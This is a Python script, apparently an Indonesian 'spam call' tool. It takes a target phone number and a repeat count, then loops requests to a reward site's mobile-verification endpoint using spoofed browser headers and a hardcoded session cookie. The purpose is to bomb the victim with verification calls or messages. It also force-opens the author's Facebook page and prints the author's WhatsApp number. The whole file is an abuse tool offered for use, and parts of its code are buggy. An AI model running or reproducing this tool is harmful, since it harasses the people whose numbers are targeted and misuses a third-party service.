from requests import ConnectionError
from time import sleep
import requests,random,json,time,sys,os,re

def inuganz(text):
        for x in text + '\n':
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(random.random() * 0.01)

from requests import ConnectionError
from time import sleep
import requests,random,json,time,sys,os,re
def april(text):
        for x in text + '\n':
                sys.stdout.write(x)
                sys.stdout.flush()
                sleep(random.random() * 0.05)
                
                
def clr():
    os.system("clear")
                
def folow():
    april("\x1b[1;93mFollow Facebook Gw Dulu \x1b[1;94mBiar Work Bang\x1b[1;92m >_<")
    time.sleep(3)
    os.system("xdg-open https://www.facebook.com/profile.php?id=100078919720019")
    clr()
def logo():
    time.sleep(1)
banner = ("""
\x1b[1;93m ┌───────────────────────────────────────────────────────────────────────────────┐
\x1b[1;94m │    ███████╗██████╗  █████╗ ███╗   ███╗     ██████╗ █████╗ ██╗     ██╗         │
\x1b[1;95m │    ██╔════╝██╔══██╗██╔══██╗████╗ ████║    ██╔════╝██╔══██╗██║     ██║         │
\x1b[1;96m │    ███████╗██████╔╝███████║██╔████╔██║    ██║     ███████║██║     ██║         │
\x1b[1;97m │    ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║    ██║     ██╔══██║██║     ██║         │
\x1b[1;91m │    ███████║██║     ██║  ██║██║ ╚═╝ ██║    ╚██████╗██║  ██║███████╗███████╗    │
\x1b[1;93m │    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝    │
\x1b[1;94m └───────────────────────────────────────────────────────────────────────────────┘

    \t \x1b[1;92m[+] Author   : @Xenz
    \t \x1b[1;92m[+] Github   : github.com/Xenz-11
    \t \x1b[1;92m[+] Whatsaap : +6283138613993
    \t        \x1b[1;90mBy : InuGanz
    \t           \x1b[1;90mFb : Xenz Why""")
def scrip():
    time.sleep(1)
    inuganz(banner)
    print ("")
    april("\x1b[1;94mGunakan awalan 8xxx")
    print ("\x1b[1;93m")
    nomor = input("[+] Masukan Nomer Target Bang  ~> ")
    jumlah = int(input("[+] Masukan Jumlah Spam ~> "))
    april("\x1b[1;95mKALO DAH LIMIT TUNGGU BEBERAPA MENIT YA")
    time.sleep(2)
    ua = {
    'Host':" id.jagreward.com",
    'Connection':' keep-alive',
    'sec-ch-ua':' " Not A;Brand";v="99", "Chromium";v="98"',
    'Accept':' */*',
    'X-Requested-With':' XMLHttpRequest',
    'sec-ch-ua-mobile':' ?1',
    'User-Agent':' Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36',
    'sec-ch-ua-platform':' "Android',
    'Sec-Fetch-Site':' same-origin',
    'Sec-Fetch-Mode':' cors',
    'Sec-Fetch-Dest':' empty',
    'Referer':' https://id.jagreward.com/member/register/',
    'Accept-Encoding':' gzip, deflate, br',
    'Accept-Language':' id-ID,id;q=0.9',
    'Cookie':' PHPSESSID=5bv12raled364sfc65dfdlsqf8; DAPROPS="sjs.webGlRenderer:Adreno (TM) 308|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.6875|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.1950627258.1649438131; _gid=GA1.3.1175869502.1649438131; _gat=1',
    }

    url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
    for i in range(jumlah):
        req = requests.get(url,'headers=ua').text
        xenz = json.loads(req)
        xn = xenz["result"]
        xx = xenz["message"]
    april(f"\x1b[1;92mResult: {xn}, Message: {xx}")
def lagi():
    lagi = input("Lagi Gak Bang [y/t] : ")
    if lagi == "y":
       clr()
       logo()
       scrip()
    if lagi == "t":
        april("\x1b[1;94mOke Bang Bye")        
        april("\x1b[1;93mMakasih Dah Pake Sc Gw :)")    
        time.sleep(2)
        sys.exit
        clr()

clr()
folow()
logo()
scrip()
lagi()